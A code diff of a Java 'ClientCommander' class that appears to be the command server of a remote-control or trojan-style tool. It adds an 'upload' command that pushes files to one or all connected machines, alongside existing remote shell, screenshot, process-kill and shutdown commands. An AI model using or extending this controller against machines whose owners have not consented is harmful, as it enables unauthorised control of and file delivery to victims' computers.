@@ -70,7 +70,7 @@ public class ClientCommander implements Runnable
     private boolean commandValid(String command)
     {
         command = command.toLowerCase();
-        return command.equals(CMD_TALK) || command.equals(CMD_REMOTE_SHELL) || command.equals(CMD_KILL_PROCESS) || command.equals(CMD_LIST_PROCESSES) || command.equals(CMD_MINIMISE) || command.equals(CMD_WALLPAPER) || command.equals(CMD_ROTATE) || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
+        return command.equals(CMD_UPLOAD) || command.equals(CMD_TALK) || command.equals(CMD_REMOTE_SHELL) || command.equals(CMD_KILL_PROCESS) || command.equals(CMD_LIST_PROCESSES) || command.equals(CMD_MINIMISE) || command.equals(CMD_WALLPAPER) || command.equals(CMD_ROTATE) || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
     }
 
     /**
@@ -161,7 +161,7 @@ public class ClientCommander implements Runnable
     }
 
     /**
-     * processes two argument commands, e.g. wallpaper, sound, type, rotate, talk
+     * processes two argument commands, e.g. wallpaper, sound, type, rotate, talk, upload
      * @param cmd the command itself, e.g. sound
      * @param host the IP address of the host to perform the command on, or all
      * @param arg an argument for the command
@@ -171,15 +171,15 @@ public class ClientCommander implements Runnable
     private void processTwoArgCommand(String cmd, String host, String arg) throws UnknownHostException, IOException
     {
         File toSend = null;
-        if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER))
+        if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER) || cmd.equals(CMD_UPLOAD))
             toSend = new File(arg);
 
         ConnectedClient target = null;
         if(host.equals(HOST_ALL))
         {
             sendCommandAll(cmd);
-            if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER))
-                sendFileAll(toSend, (int) toSend.length());
+            if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER) || cmd.equals(CMD_UPLOAD))
+                sendFileAll(toSend);
             else
                 sendCommandAll(arg);
             return;
@@ -190,8 +190,8 @@ public class ClientCommander implements Runnable
         if(target != null)
         {
             target.sendCommandPart(cmd);
-            if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER))
-                target.sendFile(toSend, (int)toSend.length());
+            if(cmd.equals(CMD_SOUND) || cmd.equals(CMD_WALLPAPER) || cmd.equals(CMD_UPLOAD))
+                target.sendFile(toSend);
             else
                 target.sendCommandPart(arg);
         }
@@ -305,10 +305,10 @@ public class ClientCommander implements Runnable
         }
     }
 
-    private void sendFileAll(File toSend, int size) throws IOException
+    private void sendFileAll(File toSend) throws IOException
     {
         for (Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
-            client.getValue().sendFile(toSend, size);
+            client.getValue().sendFile(toSend);
     }
 
     /**
